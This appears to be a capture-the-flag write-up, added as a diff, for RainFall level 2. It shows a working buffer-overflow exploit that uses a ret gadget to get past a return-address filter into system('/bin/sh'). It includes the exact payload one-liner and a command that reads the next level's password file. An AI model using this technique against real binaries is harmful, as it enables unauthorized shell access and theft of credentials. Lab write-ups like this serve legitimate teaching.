@@ -1,0 +1,50 @@
+# RainFall - Level 2: Buffer Overflow with ROP Bypass
+
+## What's the Vulnerability?
+The program has a **buffer overflow** in the `p()` function caused by the `gets()` function, which reads unlimited input into a 76-byte buffer. We can overflow the buffer and overwrite the return address to control program execution.
+
+## The Catch: Security Filter
+After reading input, the program checks the return address with this code:
+- It checks if the return address starts with `0xb` (which is the memory region for stack and libc)
+- If it does, the program exits with `_exit()`
+- This blocks normal shellcode injection and direct libc calls
+
+## How to Bypass It
+Instead of jumping directly to malicious code, we use a **ROP Trampoline**:
+
+1. **First Return**: Jump to a `ret` instruction inside the program itself (at address `0x0804853e`)
+2. **Why it works**: Program code is at `0x08xxxxxx`, not `0xbxxxxxxx`, so it passes the security check
+3. **Second Return**: The `ret` instruction pops the next address off the stack, which then jumps to our real target (`system()`) - but the filter is already bypassed!
+
+## Memory Addresses We Need
+- `system()` function: `0xb7e6b060`
+- `exit()` function: `0xb7e5ebe0`
+- `"/bin/sh"` string: `0xb7f8cc58`
+
+## How to Build the Exploit
+
+The buffer overflow needs 80 bytes of padding to reach the return address. Here's what to send:
+
+1. **80 bytes** of junk (e.g., `Q` characters) - fills the buffer
+2. **4 bytes** - address of `ret` instruction: `\x3e\x85\x04\x08`
+3. **4 bytes** - address of `system()`: `\x60\xb0\xe6\xb7`
+4. **4 bytes** - address of `exit()`: `\xe0\xeb\xe5\xb7`
+5. **4 bytes** - address of `"/bin/sh"`: `\x58\xcc\xf8\xb7`
+
+## Running the Exploit
+
+Execute this command to get a shell:
+
+```bash
+(python -c 'print "Q" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"'; cat) | ./level2
+```
+
+The `cat` keeps the shell interactive. Once you have shell access:
+
+```bash
+whoami
+# Should show: level3
+
+cat /home/user/level3/.pass
+# Shows the password for the next level
+```
